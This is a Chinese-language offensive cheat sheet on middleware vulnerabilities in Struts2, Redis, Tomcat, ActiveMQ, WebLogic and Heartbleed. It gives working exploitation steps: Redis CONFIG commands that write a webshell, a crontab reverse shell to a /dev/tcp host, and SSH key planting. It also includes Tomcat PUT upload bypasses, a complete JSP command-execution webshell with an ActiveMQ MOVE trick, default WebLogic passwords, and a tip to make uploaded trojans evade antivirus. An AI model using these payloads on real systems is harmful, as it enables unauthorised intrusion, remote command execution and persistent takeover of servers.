# Java平台中间件漏洞

## Struts2漏洞
Struts是Apache基金会Jakarta项目组的一个开源项目，Struts通过采用Java Servlet/JSP技术，实现了基于Java EE Web应用的Model-View-Controller（MVC）设计模式的应用框架，是MVC经典设计模式中的一个经典产品。目前，Struts广泛应用于大型互联网企业、政府、金融机构等网站建设，并作为网站开发的底层模板使用，是应用最广泛的Web应用框架之一。
**漏洞原理**
S2-051漏洞：REST插件使用了过时的XStream库，该库允许使用特殊构建的XML负载的恶意请求执行DoS攻击。
S2-052漏洞：Struts2 REST插件的XStream组件存在反序列化漏洞，使用XStream组件对XML格式的数据包进行反序列化操作时，未对数据内容进行有效验证，存在安全隐患，可被远程攻击。
S2-053漏洞：Struts2在使用Freemarker模板引擎的时候，同时允许解析OGNL表达式。导致用户输入的数据本身不会被OGNL解析，但由于被Freemarker解析一次后变成了一个OGNL表达式，被OGNL解析第二次，导致任意命令执行漏洞。
**漏洞挖掘**
（1）工具爬行
（2）找到存在漏洞地址例如：后缀：xxx.do，或者是 xxx.action
（3）用相关工具进行测试即可
*struts2中间件一般搭建在tomcat中，是以管理员身份运行的*


## Redis漏洞
Redis是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。
**漏洞原理**
Redis 默认情况下，会绑定在 0.0.0.0:6379，，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的config 命令，可以进行写文件操作，攻击者可以成功将自己的ssh公钥写入目标服务器的 `/root/.ssh` 文件夹的`authotrized_keys` 文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器。
**漏洞挖掘**
redis绑定在 `0.0.0.0:6379`，且没有进行添加防火墙规则避免其他非信任来源 ip 访问等相关安全策略，直接暴露在公网；
没有设置密码认证（一般为空），可以免密码远程登录redis服务。
**Redis漏洞利用**
一旦控制 redis 后，优先想到的是写 webshell，容错性是它最大优势。假定目标是 PHP 环境、web 的根目录为/var/www/html，按前面步骤尝试写个普通 PHP 脚本看下是否能成功解析
`redis-cli -p 6379 -h 192.168.230.128`     远程连接redis
`192.168.230.128:6379> CONFIG SET dbfilename phpinfo.php`
`192.168.230.128:6379> CONFIG SET dir "/var/www/html"`
`192.168.230.128:6379> CONFIG SET rdbcompression no`
`192.168.230.128:6379> SET phpinfo"\n\n <?php phpinfo(); ?> \n\n" NX`
`192.168.230.128:6379> save`
将[[ReverseShell|反弹 shell 脚本]]写入/etc/crontab
`set 1 "\n\n\n\n* * * * * root bash -i >& /dev/tcp/192.168.8.124/1122 0>&1\n\n\n\n"`
`config set dir /etc/`
`config set dbfilename crontab`
`save`
利用MSF 破解Redis弱口令导入ssh公钥链接
`auxiliary/scanner/redis/file_upload`   该exp功能为上传本地的文件到目标服务器。
`auxiliary/scanner/redis/redis_login `  该exp功能是对redis的密码进行枚举，亲测速度很快。
`auxiliary/scanner/redis/redis_server `  该exp功能是验证枚举或者其他手段得到的redis密码是否正确，该功能会执行一个info命令并返回执行结果。
上传文件ssh密钥
`auxiliary/scanner/redis/file_upload`  上传文件模块
`ssh-keygen -t rsa`
`cd /root/.ssh/`
`cp id_rsa.pub  authorized_keys`
`vi authorized_keys`
在文件内容得前面和后面都加上\n\n\n
为了能正常上传测试，在目标机器上创建/root/.ssh 目录
`mkdir /root/.ssh`
`ssh -i id_rsa root@192.168.230.128`


## tomcat远程命令执行漏洞(CVE-2017-12615)影响范围Apache Tomcat 7.0.0 – 7.0.81
**漏洞验证**
利用PUT方法上传构造好的shell
在构造上传方法时有三种
`PUT /test.jsp%20`
`PUT /test.jsp/`
`PUT /test.jsp:DATA`
通过构造特殊的后缀来绕过，Tomcat的检测，将jsp的shell上传到服务器中。
利用上传的shell来进行命令执行
`http://192.168.230.131:8080/test.jsp?cmd=ipconfig`


## Apache ActiveMQ Fileserver远程代码执行漏洞
**漏洞挖掘**
扫端口的时候遇到8161端口，输入admin/admin
通过put上去一句话然后move移动到admin目录即可拿shell
**漏洞利用**
获取物理路径
`PUT /fileserver/%20/%20 HTTP/1.1`
PUT 一个 Jsp 的 Webshell 到 fileserver 目录
`PUT /fileserver/1.jsp HTTP/1.1 `
`<%@ page import="java.io.*"%>`
`<% out.print("Hello</br>");String strcmd = request.getParameter("cmd");String line =null;Process p=Runtime.getRuntime().exec(strcmd);InputStream is = p.getInputStream();BufferedReader br = new BufferedReader(new InputStreamReader(is));while((line =br.readLine())!=null){out.print(line+"<br>");}%>`
利用 MOVE 方法将 Webshell 移入 admin/ 目录
`MOVE /fileserver/1.jsp  HTTP/1.1`
`Destination:file://C:\activemq\webapps\admin\11.jsp`


## weblogic攻击
**漏洞挖掘**
批量扫描WebLogic缺省的WEB管理端口（http为7001，https为7002），开放这两个端口的一般都是安装有WebLogic的主机。
Google搜索关键字“WebLogic Server Administration Console inurl:console”，URL后面是console结尾的，一般为目标。
**漏洞挖掘**
尝试弱口令登录
用户名密码均为：weblogic 
用户名密码均为：system 
用户名密码均为：portaladmin 
用户名密码均为：guest
登录后找到“mydomain”->“Deployments”->“Web Application Modules”->“Deploy new Web Application Moudule...”
再点里面的“upload your file(s)”，在跳转后的页面上传war包（war包和Tomcat弱口令利用的包一样，注意马的免杀即可）



# PHP平台中间件漏洞

## PHPstudy RCE 漏洞



# 其他中间件漏洞
## 心脏滴血漏洞
**漏洞范围**
OpenSSL1.0.1版本
**漏洞成因**
Heartbleed漏洞是由于未能在memcpy()调用受害用户输入内容作为长度参数之前正确进行边界检查。攻击者可以追踪OpenSSL所分配的64KB缓存、将超出必要范围的字节信息复制到缓存当中再返回缓存内容，这样一来受害者的内存内容就会以每次64KB的速度进行泄露。
